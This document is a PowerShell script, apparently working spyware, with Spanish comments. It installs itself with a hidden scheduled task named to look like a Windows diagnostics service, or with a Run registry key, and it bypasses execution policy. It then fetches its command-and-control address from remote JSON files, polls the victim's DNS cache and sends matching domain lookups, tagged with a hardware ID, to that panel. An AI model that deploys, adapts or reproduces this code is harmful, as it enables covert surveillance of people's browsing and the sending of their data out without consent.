# dns_watcher.ps1
# Sin flags        -> instala la Scheduled Task y sale
# -Run             -> loop principal (lo usa la Scheduled Task internamente)
# -DebugMode       -> instala con output en consola
# -DebugMode -Run  -> loop con output en consola (para probar sin instalar)

param(
    [switch]$DebugMode,
    [switch]$Run
)

# --- LOG ----------------------------------------------------------------------

$logFile = "$env:APPDATA\dns_watcher.log"

function dlog([string]$msg, [string]$level = 'INFO') {
    $line = "[$(Get-Date -Format 'HH:mm:ss')] [$level] $msg"
    if ($DebugMode) {
        Write-Host $line -ForegroundColor $(
            switch ($level) { 'OK' {'Green'} 'WARN' {'Yellow'} 'ERR' {'Red'} default {'Cyan'} }
        )
    }
    try {
        if ((Test-Path $logFile) -and (Get-Item $logFile).Length -gt 500KB) {
            Move-Item $logFile ($logFile + '.bak') -Force
        }
        Add-Content $logFile $line -Encoding UTF8
    } catch {}
}

# --- HWID ---------------------------------------------------------------------

function Get-Hwid {
    try {
        $vol = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$env:HOMEDRIVE'" -ErrorAction Stop).VolumeSerialNumber
        if ($vol) { return $vol.Trim() + "1" }
    } catch {}
    try {
        $mid = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid
        if ($mid) { return ($mid -replace '-', '').Substring(0, 15) + "1" }
    } catch {}
    return "UNKNOWN1"
}

# --- RESOLUCION DE URL DEL PANEL ----------------------------------------------
# Siempre consulta wjquery.json en vivo. Sin cache en disco.
# Prueba cada candidato contra el endpoint real antes de aceptarlo.

function Resolve-PanelBase {
    $sources = @(
        'https://ww4.sirheck.cfd/wjquery.json',
        'https://ww4.poderyfinanzas.cfd/wjquery.json'
    )

    foreach ($src in $sources) {
        dlog "Resolviendo desde: $src"
        try {
            $resp = Invoke-WebRequest -Uri $src -UseBasicParsing -TimeoutSec 10 `
                        -Headers @{ 'User-Agent' = 'WinHttpClient' }
            $raw = $resp.Content.Trim()
            if ($raw -eq '') { dlog "Respuesta vacia: $src" 'WARN'; continue }

            dlog "Raw: $($raw.Substring(0, [Math]::Min(120, $raw.Length)))"

            $candidates = @()
            try {
                $json = $raw | ConvertFrom-Json
                $ep = if ($json.endpoint) { $json.endpoint }
                      elseif ($json.base)  { $json.base }
                      elseif ($json.url)   { $json.url }
                      else                 { $null }
                if ($ep) { $candidates += $ep.TrimEnd('/') }
            } catch {}

            $raw -split '\|' | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' } | ForEach-Object {
                $candidates += $_.TrimEnd('/')
            }

            dlog "Candidatos: $($candidates -join ' | ')"

            foreach ($c in $candidates) {
                try {
                    $probe = Invoke-WebRequest -Uri "$c/api/dns_watch_config.php?hwid=TEST1" `
                                 -UseBasicParsing -TimeoutSec 6 `
                                 -Headers @{ 'User-Agent' = 'WinHttpClient' }
                    if ($probe.StatusCode -lt 500) {
                        dlog "Panel base activo: $c" 'OK'
                        return $c
                    }
                } catch { dlog "No responde: $c" 'WARN' }
            }

            if ($candidates.Count -gt 0) {
                dlog "Sin respuesta de candidatos, usando: $($candidates[0])" 'WARN'
                return $candidates[0]
            }

        } catch { dlog "Error al contactar $src : $_" 'ERR' }
    }

    dlog "No se pudo resolver panel base" 'ERR'
    return $null
}

# --- PULL CONFIG --------------------------------------------------------------
# Retorna @{ patterns; blacklist; ok } -- ok=$false indica re-resolver URL

function Pull-Config([string]$PanelBase) {
    try {
        $url  = "$PanelBase/api/dns_watch_config.php?hwid=$script:Hwid"
        dlog "Pull config: $url"
        $resp = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 `
                    -Headers @{ 'User-Agent' = 'WinHttpClient' }
        $data = $resp.Content | ConvertFrom-Json
        try { $data | ConvertTo-Json -Depth 5 | Set-Content $script:configCache -Encoding UTF8 } catch {}
        dlog "Config OK - patterns: $($data.patterns -join ', ') | blacklist: $($data.blacklist -join ', ')" 'OK'
        return @{ patterns = $data.patterns; blacklist = $data.blacklist; ok = $true }
    } catch {
        dlog "Pull-Config fallo ($PanelBase): $_" 'ERR'
        $cachedP = @(); $cachedB = @()
        try {
            if (Test-Path $script:configCache) {
                $c = Get-Content $script:configCache -Raw | ConvertFrom-Json
                $cachedP = $c.patterns; $cachedB = $c.blacklist
                dlog "Usando cache local" 'WARN'
            }
        } catch {}
        return @{ patterns = $cachedP; blacklist = $cachedB; ok = $false }
    }
}

# --- SEND HIT -----------------------------------------------------------------
# Retorna $true si tuvo exito, $false si fallo (senal para re-resolver URL)

function Send-Hit([string]$PanelBase, [string]$Pattern, [string]$DnsEntry) {
    $body = @{
        hwid      = $script:Hwid
        pattern   = $Pattern
        dns_entry = $DnsEntry
        ts        = [int][double]::Parse((Get-Date -UFormat %s))
    } | ConvertTo-Json -Compress

    try {
        $r = Invoke-WebRequest -Uri "$PanelBase/api/dns_watch_hit.php" -Method Post `
                -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) `
                -ContentType 'application/json; charset=utf-8' `
                -UseBasicParsing -TimeoutSec 10 `
                -Headers @{ 'User-Agent' = 'WinHttpClient' }
        dlog "HIT [$Pattern] $DnsEntry -> $($r.StatusCode)" 'OK'
        return $true
    } catch {
        dlog "Send-Hit fallo [$Pattern] $DnsEntry : $_" 'ERR'
        return $false
    }
}

# --- INSTALACION --------------------------------------------------------------

function Install-Persistence {
    $scriptDest = "$env:APPDATA\dns_watcher.ps1"

    try {
        if ($PSCommandPath -ne '') {
            Copy-Item $PSCommandPath $scriptDest -Force
        } elseif ($script:ScriptBlock) {
            [System.IO.File]::WriteAllText($scriptDest, $script:ScriptBlock.ToString(), [System.Text.Encoding]::UTF8)
        } else {
            dlog "Sin ruta de script ni ScriptBlock, ejecuta desde archivo" 'ERR'
            return
        }
        dlog "Script guardado en: $scriptDest" 'OK'
    } catch {
        dlog "No se pudo guardar script: $_" 'ERR'
        return
    }

    $psArgs = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$scriptDest`" -Run"

    # Intentar Scheduled Task primero; si falla por permisos, usar Run registry key
    $taskOk = $false
    try {
        $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArgs
        $trigBoot = New-ScheduledTaskTrigger -AtLogOn
        $trigRep  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
        $settings = New-ScheduledTaskSettingsSet `
                        -Hidden `
                        -ExecutionTimeLimit (New-TimeSpan -Hours 0) `
                        -MultipleInstances IgnoreNew `
                        -RestartCount 3 `
                        -RestartInterval (New-TimeSpan -Minutes 1)

        Register-ScheduledTask `
            -TaskName 'WindowsNetworkDiagnostics' `
            -Action   $action `
            -Trigger  @($trigBoot, $trigRep) `
            -Settings $settings `
            -RunLevel Limited `
            -Force -ErrorAction Stop | Out-Null

        dlog "Scheduled Task registrada" 'OK'
        $taskOk = $true
        try {
            Start-Sleep -Seconds 3
            Start-ScheduledTask -TaskName 'WindowsNetworkDiagnostics' -ErrorAction Stop
            dlog "Scheduled Task iniciada" 'OK'
        } catch {
            dlog "Task registrada pero no se pudo iniciar ahora, se iniciara en logon: $_" 'WARN'
        }
    } catch {
        dlog "Scheduled Task fallo (sin permisos?), usando registro Run: $_" 'WARN'
    }

    if (-not $taskOk) {
        try {
            $regPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            Set-ItemProperty -Path $regPath -Name 'WindowsNetworkDiagnostics' `
                -Value "powershell.exe $psArgs" -ErrorAction Stop
            dlog "Persistencia via registro Run (HKCU) registrada" 'OK'
        } catch {
            dlog "Error registrando en Run registry: $_" 'ERR'
        }
    }

    # Arrancar el loop ahora mismo en segundo plano (independiente del metodo de persistencia)
    try {
        Start-Process powershell.exe `
            -ArgumentList $psArgs `
            -WindowStyle Hidden `
            -ErrorAction Stop
        dlog "Loop iniciado en segundo plano" 'OK'
    } catch {
        dlog "No se pudo iniciar el loop ahora: $_" 'WARN'
    }

    if ($DebugMode) { Write-Host "`nInstalacion completa. Log: $logFile" -ForegroundColor Green }
}

# --- ENTRY POINT --------------------------------------------------------------

$script:Hwid        = Get-Hwid
$script:configCache = "$env:APPDATA\dns_watcher_cfg.json"
$script:ScriptBlock = try { $MyInvocation.MyCommand.ScriptBlock } catch { $null }
$configMaxAge       = 1800
$pollInterval       = 4
$baseResolveRetry   = 60

dlog "Iniciando. HWID=$($script:Hwid) Run=$Run DebugMode=$DebugMode"

if (-not $Run) {
    Install-Persistence
    exit
}

# --- LOOP PRINCIPAL -----------------------------------------------------------

$panelBase   = $null
$patterns    = @()
$blacklist   = @()
$lastPull    = 0
$reported    = @{}
$needResolve = $true

while ($true) {

    if ($needResolve) {
        dlog "Resolviendo panel base..."
        $panelBase = Resolve-PanelBase
        if ($panelBase) {
            $needResolve = $false
            $lastPull    = 0
        } else {
            dlog "Sin panel base, reintentando en ${baseResolveRetry}s" 'WARN'
            Start-Sleep -Seconds $baseResolveRetry
            continue
        }
    }

    $now = [int][double]::Parse((Get-Date -UFormat %s))

    if (($now - $lastPull) -ge $configMaxAge -or $patterns.Count -eq 0) {
        $result    = Pull-Config $panelBase
        $patterns  = $result.patterns
        $blacklist = $result.blacklist
        if ($result.ok) {
            $lastPull = $now
        } else {
            dlog "Pull fallo, se re-resolvera la URL" 'WARN'
            $needResolve = $true
            Start-Sleep -Seconds $pollInterval
            continue
        }
        if ($patterns.Count -eq 0) { dlog "Sin patterns en panel" 'WARN' }
    }

    if ($patterns -and $patterns.Count -gt 0) {
        try { $dnsEntries = Get-DnsClientCache -ErrorAction Stop }
        catch { dlog "Get-DnsClientCache: $_" 'ERR'; $dnsEntries = @() }

        foreach ($entry in $dnsEntries) {
            $name = $entry.Entry.ToLower()

            $blocked = $false
            foreach ($bl in $blacklist) {
                $blp = $bl.ToLower().Trim()
                $blocked = if ($blp.StartsWith('*.')) { $name -like $blp }
                           else { $name -like "*$blp*" }
                if ($blocked) { break }
            }
            if ($blocked) { continue }

            foreach ($pattern in $patterns) {
                $pat   = $pattern.ToLower().Trim()
                $match = ($pat -eq '*') -or
                         (if ($pat.StartsWith('*.')) { $name -like $pat } else { $name -like "*$pat*" })
                if ($match) {
                    $cooldown = if ($pat -eq '*') { 3600 } else { 600 }
                    $key = "$pat|$name"
                    if (-not $reported[$key] -or ($now - $reported[$key]) -ge $cooldown) {
                        dlog "MATCH: $pat -> $name"
                        $sent = Send-Hit $panelBase $pat $name
                        if ($sent) {
                            $reported[$key] = $now
                        } else {
                            dlog "Hit fallo, se re-resolvera la URL" 'WARN'
                            $needResolve = $true
                        }
                    }
                }
            }
        }

        $stale = @($reported.Keys | Where-Object { ($now - $reported[$_]) -gt 3600 })
        foreach ($k in $stale) { $reported.Remove($k) }
    }

    Start-Sleep -Seconds $pollInterval
}
